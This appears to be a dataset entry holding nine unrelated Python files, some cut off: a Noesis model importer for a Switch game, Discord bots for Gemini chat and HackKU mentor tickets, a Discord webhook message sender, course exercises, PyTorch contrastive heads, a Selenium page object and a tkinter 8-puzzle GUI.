    "# Inazuma Eleven Victory Road (Nintendo Switch)\r\n# Noesis script adapted by Daiki froms DKDave's Yokai Watch 4 script\r\n# Load meshes from both .G4PKM and .G4MD files\r\n# Last updated: 12 April  2024\r\n\r\n# TO DO LIST:\r\n\r\n# Possibily some textures are loading wrong\r\n# Add skeleton\r\n\r\n\r\nfrom inc_noesis import *\r\n\r\ndef registerNoesisTypes():\r\n\thandle = noesis.register(\"Inazuma Eleven Victory Road (Switch)\",\".g4pkm;.g4md\")\r\n\tnoesis.setHandlerTypeCheck(handle, bcCheckType)\r\n\tnoesis.setHandlerLoadModel(handle, bcLoadModel)\r\n\tnoesis.logPopup()\r\n\treturn 1\r\n\r\n\r\n# Check file type\r\n\r\ndef bcCheckType(data):\r\n\tbs = NoeBitStream(data)\r\n\tfile_id = bs.readUInt()\r\n\r\n\tif file_id == 0x4b503447 or file_id == 0x444d3447:\r\n\t\treturn 1\r\n\telse:\r\n\t\treturn 0\r\n\r\n\r\ndef bcLoadModel(data, mdlList):\r\n\tbs = NoeBitStream(data)\r\n\tctx = rapi.rpgCreateContext()\r\n\r\n\tcurr_folder = rapi.getDirForFilePath(rapi.getInputName()).lower()\r\n\tcurr_file = rapi.getLocalFileName(rapi.getInputName()).lower()\r\n\r\n\tbones = []\r\n\r\n\tfilename = curr_file.split(\".\")[0]\r\n\tvert_file = filename + \".g4mg\"\r\n\ttex_file = filename + \".g4tx\"\r\n\r\n\tif \".g4pkm\" in curr_file:\r\n\t\tbs.seek(0x48)\r\n\t\tskel_size = bs.readUInt()\r\n\t\tbs.seek(0x80)\r\n\t\tsk = NoeBitStream(bs.readBytes(skel_size))\r\n\r\n# For some models, the G4MD inside the G4PKM file doesn't work, but the separate G4MD file does (if it exists), so load that instead\r\n\r\n\t\tif rapi.checkFileExists(curr_folder + filename + \".g4md\"):\r\n\t\t\tmd = NoeBitStream(rapi.loadIntoByteArray(curr_folder + filename + \".g4md\"))\r\n\t\t\tprint(\"External G4MD file loaded\")\r\n\t\telse:\r\n\t\t\toffset = data.find(b'G4MD')\r\n\t\t\tbs.seek(offset + 0x0c)\r\n\t\t\tmd_size = bs.readUInt() + 0xa0\r\n\t\t\tbs.seek(offset)\r\n\t\t\tmd = NoeBitStream(bs.readBytes(md_size))\r\n\r\n\telse:\r\n\t\tmd = NoeBitStream(bs.readBytes(len(data)))\r\n\r\n\r\n\r\n# Load vertex data file if it exists (or exit if not)\r\n\r\n\tif rapi.checkFileExists(curr_folder + vert_file):\r\n\t\tvf = NoeBitStream(rapi.loadIntoByteArray(curr_folder + vert_file))\r\n\t\tprint(\"Geometry data file loaded.\")\r\n\telse:\r\n\t\tprint(\"Vertex data file \" + vert_file + \" doesn't exist.\")\r\n\t\treturn 1\r\n\r\n\r\n# Read the mesh data\r\n\r\n\tmd.seek(4)\r\n\tsubmesh_info = md.readUShort()\r\n\tmd.seek(0x20)\r\n\tsubmesh_count = md.readUShort()\r\n\tmat_count = md.readUShort()\r\n\tmd.seek(0x26)\r\n\tvlayout_count = md.readUByte()\r\n\tmd.seek(0x5c)\r\n\tface_data = md.readUInt()\r\n\r\n\tvlayout_offs = []\r\n\tvnames = [\"\", \"Verts\", \"Normals\", \"\", \"\", \"\", \"\", \"\", \"Colours\", \"\", \"UV\", \"UV2\", \"UV3\", \"UV4\", \"UV5\", \"UV6\"]\r\n\tvlayout = (submesh_count * 0x50) + submesh_info\r\n\tmd.seek(vlayout)\r\n\r\n\tfor v in range(vlayout_count):\r\n\t\tvlayout_offs.append(md.tell())\r\n\t\tmd.readUByte()\r\n\t\tentry_count = md.readUByte()\r\n\t\tmd.readBytes(6)\r\n\t\tmd.seek(entry_count * 8, 1)\r\n\r\n\tmat_table = md.tell()\t\t\t\t\t\t\t# how to calculate this without reading vlayout table first?\r\n\tmat_table = Align(mat_table, 16)\r\n\tmat_table2 = mat_table + (mat_count * 0x10) + 0x30\r\n\r\n\r\n# Load texture archive if it exists, and create materials\r\n# Some of this could be completely wrong ...\r\n\r\n\tif rapi.checkFileExists(curr_folder + filename + \".g4tx\"):\r\n\t\ttx = NoeBitStream(rapi.loadIntoByteArray(curr_folder + tex_file))\r\n\t\tprint(\"Texture data file loaded.\")\r\n\t\ttex_list, tex_names = ReadTextures(tx)\r\n\t\tmat_list = []\r\n\r\n\t\tfor m in range(mat_count):\r\n\t\t\tmd.seek(mat_table + (m * 0x10) + 12)\r\n\t\t\tmcount = md.readUShort()\r\n\t\t\tmstart = md.readUShort()\r\n\r\n\t\t\ttemp_list = []\r\n\t\t\tfor x in range(mcount):\r\n\t\t\t\tmd.seek(mat_table2 + (mstart * 6) + (x * 6))\r\n\t\t\t\tmnum = md.readUByte()\r\n\t\t\t\ttemp_list.append(mnum)\r\n\r\n\t\t\tmaterial = NoeMaterial(\"Mat_\" + str(m), \"\")\r\n\t\t\tprint(temp_list)\r\n\t\t\tif len(temp_list) == 6:\r\n\t\t\t\tdiff = temp_list[5]\r\n\t\t\t\tspec = temp_list[4]\r\n\t\t\t\tocc =  temp_list[3]\r\n\t\t\t\tmaterial.setTexture(tex_names[diff])\r\n\t\t\t\tmaterial.setSpecularTexture(tex_names[spec])\r\n\t\t\t\tmaterial.setOcclTexture(tex_names[occ])\r\n\r\n\t\t\tif len(temp_list) == 5:\r\n\t\t\t\tdiff = temp_list[1] if filename[0] == \"c\" else temp_list[4]\r\n\t\t\t\tspec = temp_list[0]\r\n\t\t\t\tocc =  temp_list[2]\r\n\t\t\t\tmaterial.setTexture(tex_names[diff])\r\n\t\t\t\tmaterial.setSpecularTexture(tex_names[spec])\r\n\t\t\t\tmaterial.setOcclTexture(tex_names[occ])\r\n\t\t\t\r\n\t\t\tif len(temp_list) == 4:\r\n\t\t\t\tprint(temp_list)\r\n\t\t\t\tdiff = temp_list[3]\r\n\t\t\t\t#spec = temp_list[]\r\n\t\t\t\tmaterial.setTexture(tex_names[diff])\r\n\t\t\t\t#material.setSpecularTexture(tex_names[spec])\r\n\r\n\t\t\tif len(temp_list) == 3:\r\n\t\t\t\tdiff = temp_list[2]\r\n\t\t\t\tmaterial.setTexture(tex_names[0])\r\n\t\t\t\r\n\r\n\t\t\tmat_list.append(material)\r\n\r\n\telse:\r\n\t\tprint(\"Texture data file \" + tex_file + \" doesn't exist.  No textures will be available.\")\r\n\t\ttex_list = []\r\n\t\tmat_list = []\r\n\r\n\r\n\tfor a in range(submesh_count):\r\n\t\tmd.seek(submesh_info + (a * 0x50))\r\n\t\tmisc1 = md.tell()\r\n\t\tvert_offset = md.readUInt()\r\n\t\tface_offset = md.readUInt() + face_data\r\n\t\tvert_count = md.readUInt()\r\n\t\tface_count = md.readUInt()\r\n\t\tmd.seek(0x2e, 1)\r\n\t\tstride = md.readUByte()\r\n\t\tmd.seek(3, 1)\r\n\t\tlayout_num = md.readUByte()\r\n\t\tmat_num = md.readUByte()\r\n\r\n\t\tprint(\"----------------------------------------------------------------------------",
    "import discord\nimport os\nimport google.generativeai as genai\n\nfrom dotenv import load_dotenv\nload_dotenv()\n\ntoken = os.getenv(\"SECRET_KEY\")\ngenai.configure(api_key=os.getenv(\"GEMINI_KEY\"))\n\ngeneration_config = {\n  \"temperature\": 1,\n  \"top_p\": 1,\n  \"top_k\": 1,\n  \"max_output_tokens\": 256,\n}\n\nsafety_settings = [\n  {\n    \"category\": \"HARM_CATEGORY_HARASSMENT\",\n    \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n    \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n    \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n    \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n  },\n]\n\nmodel = genai.GenerativeModel(model_name=\"gemini-1.0-pro\", generation_config=generation_config, safety_settings=safety_settings)\n\nconvo = model.start_chat(history=[\n    {\n        \"role\": \"user\",\n        \"parts\": [\"hi\"]\n    },\n    {\n        \"role\": \"model\",\n        \"parts\": [\"Hi there! \ud83d\udc4b How can I help you today?\"]\n    },\n])\n\nclass MyClient(discord.Client):\n    async def on_ready(self):\n        print(f'Logged on as {self.user}!')\n\n    async def on_message(self, message):\n        print(f'Message from {message.author}: {message.content}')\n        if self.user!=message.author:\n            if self.user in message.mentions:\n                convo.send_message(message.content)\n\n                channel = message.channel\n                await channel.send(convo.last.text)\n\nintents = discord.Intents.default()\nintents.message_content = True\n\nclient = MyClient(intents=intents)\nclient.run(token)\n\n",
    "# Scenario\n# An anagram is a new word formed by rearranging the letters of a word, using all the original letters exactly once. For example, the phrases \"rail safety\" and \"fairy tales\" are anagrams, while \"I am\" and \"You are\" are not.\n\n# Your task is to write a program which:\n\n# asks the user for two separate texts;\n# checks whether, the entered texts are anagrams and prints the result.\n# Note:\n\n# assume that two empty strings are not anagrams;\n# treat upper- and lower-case letters as equal;\n# spaces are not taken into account during the check - treat them as non-existent\n\n######################################################################################################################\n# Test your code using the data we've provided.\n\n# Test data\n# Sample input:\n\n# Listen\n# Silent\n\n# Sample output:\n\n# Anagrams\n\n\n# Sample input:\n\n# modern\n# norman\n\n# Sample output:\n\n# Not anagrams\n######################################################################################################################\n\n\ndef isanag(txt1, txt2):\n    if len(txt1) != len(txt2):\n        return 0\n    txt1 = txt1.lower()\n    txt2 = txt2.lower()\n    dict1 = {}\n    dict2 = {}\n    for i in range(len(txt1)):\n        dict1[txt1[i]] = dict1.get(txt1[i], 0) + 1\n        dict2[txt2[i]] = dict2.get(txt2[i], 0) + 1\n    for i in dict1:\n        if dict1[i] != dict2[i]:\n            return 0\n    return 1\n\n\ntxt1 = input(\"Please enter the first word:\\n \")\ntxt2 = input(\"Please enter the second word:\\n\")\n# txt1 = \"silent\"\n# txt2 = \"listen\"\nif isanag(txt1, txt2):\n    print(\"Anagrams\")\nelse:\n    print(\"Not anagrams\")\n",
    "# Scenario\n# Your task is to slightly extend the Queue class' capabilities. We want it to have a parameterless method that returns True if \n# the queue is empty and False otherwise.\n\n# Complete the code we've provided in the editor. Run it to check whether it outputs a similar result to ours.    \n\n####################################################################################################\n# Code \n# class QueueError(???):\n#     pass\n\n\n# class Queue:\n#     #\n#     # Code from the previous lab.\n#     #\n\n\n# class SuperQueue(Queue):\n#     #\n#     # Write new code here.\n#     #\n\n\n# que = SuperQueue()\n# que.put(1)\n# que.put(\"dog\")\n# que.put(False)\n# for i in range(4):\n#     if not que.isempty():\n#         print(que.get())\n#     else:\n#         print(\"Queue empty\")\n\n####################################################################################################\n\n# Expected output\n# 1\n# dog\n# False\n# Queue empty\n\n####################################################################################################\n\nclass QueueError(IndexError):\n    pass\n\n\nclass Queue:\n    def __init__(self):\n        self.queue = []\n    def put(self,elem):\n        self.queue.insert(0,elem)\n    def get(self):\n        if len(self.queue) > 0:\n            elem = self.queue[-1]\n            del self.queue[-1]\n            return elem\n        else:\n            raise QueueError\n\nclass SuperQueue(Queue):\n    def isempty(self):\n        return not self.queue\n\nque = SuperQueue()\nque.put(1)\nque.put(\"dog\")\nque.put(False)\nfor i in range(4):\n    if not que.isempty():\n        print(que.get())\n    else:\n        print(\"Queue empty\")\n",
    "#TODO: add types\n\nimport nextcord as nc\nfrom nextcord.ext import commands as nc_cmd\nimport nextcord.utils as nc_utils\nfrom nextcord.ext import application_checks as nc_app_checks\n\nimport logging\nimport sqlite3 as sql\nimport json\n\nlogging.basicConfig(level=logging.INFO)\n\nlogger = logging.getLogger('nextcord')\n\nwith open('config.json') as jsonfile:\n    config = json.load(jsonfile)\n\nbot = nc_cmd.Bot()\n\ndb_connection = sql.connect(config['DB_FILE'])\n\n@bot.event\nasync def on_ready():\n    logging.info(f'We have logged in as {bot.user}')\n\n@bot.event\nasync def on_application_command_error(ctx: nc.Interaction, err: Exception):\n\n    user_name = ctx.user.nick if ctx.user.nick else ctx.user.global_name\n\n    logging.warning(f'User {user_name} tried to execute {ctx.application_command.qualified_name} but does not have permission to do so.')\n    await ctx.send(\"Looks like you don't have permission to run this command... nice try :smiling_imp:\", ephemeral=True)\n\n#close {{{1\n@bot.slash_command(description=\"Close a ticket.\", guild_ids=[config['GUILD_ID']])\nasync def close(ctx: nc.Interaction, ticket_id: int) -> None:\n\n    with db_connection:\n\n        user_name = ctx.user.nick if ctx.user.nick else ctx.user.global_name\n\n        try:\n\n            db_cursor = db_connection.cursor()\n\n            if ctx.user.get_role(config['MENTOR_ROLE_ID']) is None:\n\n                ticket_info_query = db_cursor.execute('SELECT closed, claimed, mentor_assigned FROM tickets WHERE id = :ticket_id AND author_id = :user_id', {'ticket_id': ticket_id, 'user_id': ctx.user.id}).fetchone()\n                \n                if ticket_info_query is None:\n\n                    logging.warning(f'User {user_name} tried to close a ticket with ID {ticket_id}, but they do not have ownership over it or it does not exist.')\n\n                    await ctx.send(f'You do not have ownership over a ticket with ID {ticket_id}. Maybe you made a typo?', ephemeral=True)\n\n                    return\n\n                closed, claimed, assignee = ticket_info_query\n                \n                if closed == 1:\n\n                    logging.warning(f'User {user_name} tried to close a ticket with ID {ticket_id}, but it is already closed.')\n\n                    await ctx.send('This ticket has already been closed! :star_struck:', ephemeral=True)\n\n                    return\n\n                if claimed == 1:\n\n                    await ctx.send(f'Mentor {mentor_name} has claimed this ticket. Please contact them to close it.', ephemeral=True)\n\n                    return\n                \n                db_cursor.execute('UPDATE tickets SET closed = 1 WHERE id = :ticket_id', {'ticket_id': ticket_id})\n                \n                logging.info(f'User {user_name} closed thier own ticket with ID {ticket_id}.')\n\n                await ctx.send('Ticket closed! :saluting_face:', ephemeral=True)\n\n                return\n\n            ticket_info_query = db_cursor.execute('SELECT closed, mentor_assigned_id, mentor_assigned, claimed, help_thread_id FROM tickets WHERE id = :ticket_id', {'ticket_id': ticket_id}).fetchone()\n\n            if ticket_info_query is None:\n\n                await ctx.send(f'A ticket with the ID {ticket_id} does not exist. Please try again.', ephemeral=True)\n\n                logging.warning(f'Mentor {user_name} tried to close non-existant ticket with ID {ticket_id}.')\n\n                return\n            \n            closed, ticket_assignee_id, ticket_assignee_name, claimed, help_thread_id = ticket_info_query\n            \n            if ctx.user.id != ticket_assignee_id: \n\n                logging.warning(f'Mentor {user_name} tried to close a ticket with ID {ticket_id} owned by {ticket_assignee_name}.' )\n\n                await ctx.send(f'Woah there! You don\\'t own this ticket... {ticket_assignee_name} does. Contact them to close it.', ephemeral=True)\n\n                return\n\n            if closed == 1:\n\n                    logging.warning(f'Mentor {user_name} tried to close a ticket with ID {ticket_id}, but it is already closed.')\n\n                    await ctx.send('This ticket has already been closed! :star_struck:', ephemeral=True)\n\n                    return\n\n            # if the ticket has not been claimed...\n            if claimed == 0:\n               \n                await ctx.send(f'This ticket has not been claimed. Please claim it before closing it.', ephemeral=True)\n\n                return \n            \n            mentor_channel = await ctx.guild.fetch_channel(config['MENTOR_CHANNEL_ID'])\n\n            help_thread = mentor_channel.get_thread(help_thread_id)\n\n            if help_thread is None:\n\n                logging.error(f'Mentor {user_name} tried to close a ticket with ID {ticket_id}, but help thread could not be found.' )\n\n                await ctx.send('An unknown error has occured. Please contact a HackKU organizer.', ephemeral=True)\n\n                return\n            \n            await help_thread.delete()\n            logging.info(f'Deleted help thread wth ",
    "from Config.Util import *\nfrom Config.Config import *\nimport requests\nimport json\n\nTitle(\"Discord Webhook Create\")\n\nprint(f\"\"\"\n{color.WHITE}[{color.RED}01{color.WHITE}]{color.RED} -> {color.WHITE}Message Classic\n{color.WHITE}[{color.RED}02{color.WHITE}]{color.RED} -> {color.WHITE}Message Embed\n\"\"\")\ntry:\n    choice = int(input(f\"{color.RED}-> {color.RESET}\"))\nexcept:\n    ErrorChoice()\nif choice == 1:\n        def send_webhook_message(webhook_url, content):\n         payload = {\n             'content': content\n         }\n\n         headers = {\n             'Content-Type': 'application/json'\n          }\n\n         response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)\n\n         if response.status_code == 204:\n             print(f'{color.RED}[!] | Message Send.')\n             Continue()\n             Reset()\n         else:\n             print(f'{color.RED}[!] | Message not Send.')\n             Continue()\n             Reset()\n\n\n        webhook_url = input(f\"\\n{color.RED}[?] | URL Webhook -> {color.RESET}\")\n        if webhook_url.lower().startswith(\"https://discord.com/api/webhooks\"):\n\n            message_content = input(f\"{color.RED}[?] | Message -> {color.RESET}\")\n            send_webhook_message(webhook_url, message_content)\n        \n        else:\n            ErrorUrl()\n\n\nif choice == 2:\n\n        def send_embed_webhook(webhook_url, embed_content):\n            payload = {\n            'embeds': [embed_content]\n             }\n\n            headers = {\n            'Content-Type': 'application/json'\n             }\n\n            response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)\n\n            if response.status_code == 204:\n                 print(f'{color.RED}[!] | Message Send.')\n                 Continue()\n                 Reset()\n            else:\n                 print(f'{color.RED}[!] | Message not Send.')\n                 Continue()\n                 Reset()\n    \n        webhook_url = input(f\"\\n{color.RED}[?] | URL Webhook -> {color.RESET}\")\n\n        print(f\"\"\" {color.RED}\n{color.WHITE}[{color.RED}01{color.WHITE}]{color.RED} -> {color.WHITE}Red\n{color.WHITE}[{color.RED}02{color.WHITE}]{color.RED} -> {color.WHITE}Orange\n{color.WHITE}[{color.RED}03{color.WHITE}]{color.RED} -> {color.WHITE}Yellow\n{color.WHITE}[{color.RED}04{color.WHITE}]{color.RED} -> {color.WHITE}Green\n{color.WHITE}[{color.RED}05{color.WHITE}]{color.RED} -> {color.WHITE}Blue\n{color.WHITE}[{color.RED}06{color.WHITE}]{color.RED} -> {color.WHITE}Magenta\n{color.WHITE}[{color.RED}07{color.WHITE}]{color.RED} -> {color.WHITE}White\n{color.WHITE}[{color.RED}08{color.WHITE}]{color.RED} -> {color.WHITE}Black \n\"\"\")\n        try:\n            color_input = int(input(f\"{color.RED}[?] | Color -> {color.RESET}\"))\n            if color_input == 1:\n                couleure = 0xFF0000  # Rouge\n            elif color_input == 2:\n                couleure = 0xFFA500  # Orange\n            elif color_input == 3:\n                couleure = 0xFFFF00  # Jaune\n            elif color_input == 4:\n                couleure = 0x00FF00  # Vert\n            elif color_input == 5:\n                couleure = 0x0080FF  # Bleu\n            elif color_input == 6:\n               couleure = 0x7f00ff  # Violet\n            elif color_input == 7: \n                couleure = 0xffffff # Blanc\n            elif color_input == 8:\n                couleure = 0x000000 # Noir\n            else:\n                couleure = color_webhook  # Rouge (par d\u00e9faut)\n        except:\n            couleure = color_webhook  # Rouge (par d\u00e9faut)\n\n        embed_content = {\n           'title': input(f\"{color.RED}[?] | Title ->{color.RESET} \"),\n           'description': input(f\"{color.RED}[?] | Description ->{color.RESET} \"),\n           'color': couleure,\n        }\n        send_embed_webhook(webhook_url, embed_content)\n\nelse:\n        ErrorChoice()",
    "from torch import nn\nfrom torch.nn import functional as F\nfrom torch.nn import init\n\nclass ContrastiveProjMLPV1(nn.Module):\n\tdef __init__(self, in_channel, out_channel, bottle_channel=64):\n\t\tsuper().__init__()\n\t\tself.conv1 = nn.Conv2d(in_channel, out_channel, 3, padding=1)\n\t\tself.bn1 = nn.BatchNorm1d(out_channel)\n\t\tself.relu = nn.ReLU()\n\t\tself.fc1 = nn.Linear(out_channel, out_channel)\n\t\tself.fc2 = nn.Linear(out_channel, out_channel)\n\t\tinit.kaiming_normal_(self.fc1.weight)\n\t\tinit.kaiming_normal_(self.fc2.weight)\n\n\n\tdef forward(self, x):\n\t\tx = self.conv1(x)\n\t\tx = F.adaptive_avg_pool2d(x, (1, 1))\n\t\tx = self.fc1(x.view(x.size(0), -1))\n\t\tx = self.bn1(x)\n\t\tx = self.relu(x)\n\t\tx = self.fc2(x)\n\t\treturn x\n\nclass ContrastiveProjMLPV2(nn.Module):\n\tdef __init__(self, in_channel, out_channel, bottle_channel=64):\n\t\tsuper().__init__()\n\t\tself.conv1 = nn.Conv2d(in_channel, bottle_channel, 3, padding=1)\n\t\tself.bn1 = nn.BatchNorm2d(bottle_channel)\n\t\tself.relu = nn.ReLU()\n\t\tself.fc1 = nn.Linear(bottle_channel, out_channel)\n\t\tinit.kaiming_normal_(self.fc1.weight)\n\t\tinit.kaiming_normal_(self.conv1.weight)\n\t\t# init.kaiming_normal_(self.conv2.weight)\n\n\tdef forward(self, x):\n\t\tx = self.conv1(x)\n\t\tx = self.relu(self.bn1(x))\n\t\tx = F.adaptive_avg_pool2d(x, (1, 1))\n\t\tx = self.fc1(x.view(x.size(0), -1))\n\t\treturn x\n\nclass ContrastiveProjMLPV3(nn.Module):\n\tdef __init__(self, in_channel, out_channel, bottle_channel=64):\n\t\tsuper().__init__()\n\t\tself.conv1 = nn.Conv2d(in_channel, bottle_channel, 3, padding=1)\n\t\tself.bn1 = nn.BatchNorm2d(bottle_channel)\n\t\tself.relu = nn.ReLU()\n\t\tself.fc1 = nn.Linear(bottle_channel, out_channel)\n\t\tself.bn2 = nn.BatchNorm1d(out_channel)\n\t\tself.fc2 = nn.Linear(out_channel, out_channel)\n\t\tinit.kaiming_normal_(self.fc1.weight)\n\t\tinit.kaiming_normal_(self.conv1.weight)\n\t\tinit.kaiming_normal_(self.fc2.weight)\n\n\tdef forward(self, x):\n\t\tx = self.conv1(x)\n\t\tx = self.relu(self.bn1(x))\n\t\tx = F.adaptive_avg_pool2d(x, (1, 1))\n\t\tx = self.fc1(x.view(x.size(0), -1))\n\t\tx = self.relu(self.bn2(x))\n\t\tx = self.fc2(x)\n\t\treturn x\n\nclass ContrastiveMLPConv(nn.Module):\n\tdef __init__(self, in_channel, out_channel, bottle_channel=64):\n\t\tsuper().__init__()\n\t\tself.conv1 = nn.Conv2d(in_channel, bottle_channel, 3, padding=1)\n\t\tself.relu = nn.ReLU()\n\t\tself.conv2 = nn.Conv2d(bottle_channel, bottle_channel, 3, padding=1)\n\t\tself.fc = nn.Linear(bottle_channel, out_channel)\n\t\tinit.kaiming_normal_(self.fc.weight)\n\t\tinit.kaiming_normal_(self.conv1.weight)\n\t\tinit.kaiming_normal_(self.conv2.weight)\n\n\tdef forward(self, x):\n\t\tx = self.relu(self.conv2(self.relu(self.conv1(x))))\n\t\tx = F.adaptive_avg_pool2d(x, (1, 1))\n\t\tx = x.view(x.size(0), x.size(1))\n\t\treturn self.fc(x)\n\n\nclass ContrastiveHead(nn.Module):\n\tdef __init__(self, feat_out_channels, out_channel=128):\n\t\tsuper().__init__()\n\t\tself.single = len(feat_out_channels) == 1\n\t\tself.MLPs = []\n\t\tfor in_channel in feat_out_channels:\n\t\t\tself.MLPs.append(ContrastiveProjMLPV3(in_channel, out_channel))\n\t\tself.MLPs = nn.ModuleList(self.MLPs)\n\n\tdef forward(self, feats, bp=True):\n\t\tif self.single:\n\t\t\treturn self.MLPs[0](feats)\n\t\toutputs = []\n\t\tfor feat, MLP in zip(feats, self.MLPs):\n\t\t\tif bp:\n\t\t\t\toutputs.append(MLP(feat))\n\t\t\telse:\n\t\t\t\toutputs.append(MLP(feat).detach())\n\t\treturn outputs\n\n\nclass pred_head(nn.Module):\n\tdef __init__(self, out_channel):\n\t\tsuper(pred_head, self).__init__()\n\t\tself.in_features = out_channel\n\n\t\tself.fc1 = nn.Linear(out_channel, out_channel)\n\t\tself.bn1 = nn.BatchNorm1d(out_channel)\n\t\t# self.fc2 = nn.Linear(out_channel, out_channel, bias=False)\n\t\tself.bn2 = nn.BatchNorm1d(out_channel)\n\t\tself.fc2 = nn.Linear(out_channel, out_channel)\n\n\t\t# init.kaiming_normal_(self.fc1.weight)\n\t\t# init.kaiming_normal_(self.fc2.weight)\n\t\t# init.eye_(self.fc1.weight)\n\t\t# init.eye_(self.fc2.weight)\n  \n\t\tself.relu = nn.ReLU(inplace=True)\n\n\tdef forward(self, x):\n\t\t# debug\n\n\t\tx = self.fc1(x)\n\t\tx = self.bn1(x)\n\n\t\tx = self.relu(x)\n\n\t\tx = self.fc2(x)\n\t\t# x = self.bn2(x)\n\n\t\treturn x\n\nclass PredictionHead(nn.Module):\n\tdef __init__(self, heads=4, out_channel=128):\n\t\tsuper().__init__()\n\t\tself.MLPs = []\n\t\tfor i in range(heads):\n\t\t\tself.MLPs.append(pred_head(out_channel))\n\t\tself.MLPs = nn.ModuleList(self.MLPs)\n\n\tdef forward(self, feats, bp=True):\n\t\toutputs = []\n\t\tfor feat, MLP in zip(feats, self.MLPs):\n\t\t\tif bp:\n\t\t\t\toutputs.append(MLP(feat))\n\t\t\telse:\n\t\t\t\toutputs.append(MLP(feat).detach())\n\t\treturn outputs\n",
    "import conftest\nfrom selenium.webdriver.common.by import By\n\nfrom pages.base_page import BasePage\n        \nclass LoginPage(BasePage):\n    \n    def __init__(self):\n        self.driver = conftest.driver\n        self.username_field = (By.ID, \"user-name\")\n        self.password_field = (By.ID, \"password\")\n        self.login_button = (By.ID, \"login-button\")\n        self.error_message_login = (By.XPATH, \"//div[contains(@class,'error-message')]\")\n        \n    def fazer_login(self, usuario, senha):\n        self.escrever(self.username_field, usuario)\n        self.escrever(self.password_field, senha)\n        self.clicar(self.login_button)\n    \n    def verificar_messagem_erro_login_existe(self):\n        self.verificar_se_elemento_existe(self.error_message_login)\n        \n    def verificar_texto_mensagem_erro_login(self, texto_esperado):\n        texto_encontrado = self.pegar_texto_elemento(self.error_message_login)\n        assert texto_encontrado == texto_esperado, f\"O texto encontrado foi '{texto_encontrado}', mas era esperado o texto '{texto_esperado}'\"",
    "# Import library tkinter (Tkinter) untuk membuat GUI\nimport tkinter as tk\nimport tkinter.ttk as ttk  # Modul tambahan untuk elemen GUI yang lebih canggih\nfrom tkinter import messagebox, simpledialog  # Modul untuk menampilkan pesan dan dialog sederhana\n\n# Import modul main yang mungkin berisi logika untuk menyelesaikan puzzle\nimport main\n\n# Inisialisasi variabel global yang akan digunakan di seluruh program\nalgorithm = None\ninitialState = None\nstatepointer = cost = counter = depth = 0\nruntime = 0.0\npath = []\n\n# Definisi kelas InterfaceApp yang akan mengatur tampilan GUI\nclass InterfaceApp:\n\n    # =============================================================================================================== #\n    ###     Build the GUI     ###\n\n    # Inisialisasi objek InterfaceApp\n    def __init__(self, master=None):\n\n        # Inisialisasi variabel yang diperlukan untuk update GUI secara asinkron\n        self._job = None\n\n        # Membuat frame utama dari GUI dengan dimensi 800x550\n        self.appFrame = ttk.Frame(master)\n        self.appFrame.configure(height=550, width=800)\n        self.appFrame.pack(side=\"top\")\n\n        # Label utama untuk judul aplikasi\n        self.mainlabel = ttk.Label(self.appFrame)\n        self.mainlabel.configure(\n            anchor=\"center\", font=\"{Forte} 55 {bold}\", foreground=\"#000000\", justify=\"center\", text='Tile-8-Solver')\n        self.mainlabel.place(anchor=\"center\", x=300, y=50)\n\n        # Tombol navigasi mundur (back)\n        self.backbutton = ttk.Button(self.appFrame)\n        self.img_backicon = tk.PhotoImage(file=\"icon/back-icon.png\")\n        self.backbutton.configure(cursor=\"hand2\", image=self.img_backicon)\n        self.backbutton.place(anchor=\"center\", height=80, width=80, x=250, y=500)\n        self.backbutton.bind(\"<ButtonPress>\", self.prevSequence)\n\n        # Tombol navigasi maju (next)\n        self.nextbutton = ttk.Button(self.appFrame)\n        self.img_nexticon = tk.PhotoImage(file=\"icon/next-icon.png\")\n        self.nextbutton.configure(cursor=\"hand2\", image=self.img_nexticon)\n        self.nextbutton.place(anchor=\"center\", height=80, width=80, x=350, y=500)\n        self.nextbutton.bind(\"<ButtonPress>\", self.nextSequence)\n\n        # Tombol navigasi cepat maju (fast forward)\n        self.fastforwardbutton = ttk.Button(self.appFrame)\n        self.img_fastforwardicon = tk.PhotoImage(file=\"icon/fast-forward-icon.png\")\n        self.fastforwardbutton.configure(cursor=\"hand2\", image=self.img_fastforwardicon)\n        self.fastforwardbutton.place(anchor=\"center\", height=80, width=80, x=450, y=500)\n        self.fastforwardbutton.bind(\"<ButtonPress>\", self.fastForward)\n\n        # Tombol navigasi cepat mundur (fast backward)\n        self.fastbackwardbutton = ttk.Button(self.appFrame)\n        self.img_fastbackwardicon = tk.PhotoImage(file=\"icon/fast-backward-icon.png\")\n        self.fastbackwardbutton.configure(cursor=\"hand2\", image=self.img_fastbackwardicon)\n        self.fastbackwardbutton.place(anchor=\"center\", height=80, width=80, x=150, y=500)\n        self.fastbackwardbutton.bind(\"<ButtonPress>\", self.fastBackward)\n\n        # Tombol untuk menghentikan fast forward\n        self.stopbutton = ttk.Button(self.appFrame)\n        self.img_stopicon = tk.PhotoImage(file=\"icon/stop.png\")\n        self.stopbutton.configure(cursor=\"hand2\", image=self.img_stopicon, state='disabled')\n        self.stopbutton.place(anchor=\"center\", height=80, width=80, x=550, y=500)\n        self.stopbutton.bind(\"<ButtonPress>\", self.stopFastForward)\n\n        # Tombol untuk mereset hitungan langkah\n        self.resetbutton = ttk.Button(self.appFrame)\n        self.img_reseticon = tk.PhotoImage(file=\"icon/reset-icon.png\")\n        self.resetbutton.configure(cursor=\"hand2\", image=self.img_reseticon, state='disabled')\n        self.resetbutton.place(anchor=\"center\", height=80, width=80, x=50, y=500)\n        self.resetbutton.bind(\"<ButtonPress>\", self.resetStepCounter)\n\n        # Label untuk menampilkan hitungan langkah\n        self.stepCount = ttk.Label(self.appFrame)\n        self.stepCount.configure(anchor=\"center\", background=\"#d6d6d6\",\n                                 font=\"{@Malgun Gothic Semilight} 12 {}\", justify=\"center\", text='0 / 0')\n        self.stepCount.place(anchor=\"center\", width=200, x=300, y=440)\n\n        # Tombol untuk memulai pemecahan puzzle\n        self.solvebutton = ttk.Button(self.appFrame)\n        self.img_solveicon = tk.PhotoImage(file=\"icon/solve-icon.png\")\n        self.solvebutton.configure(cursor=\"hand2\", text='Solve', 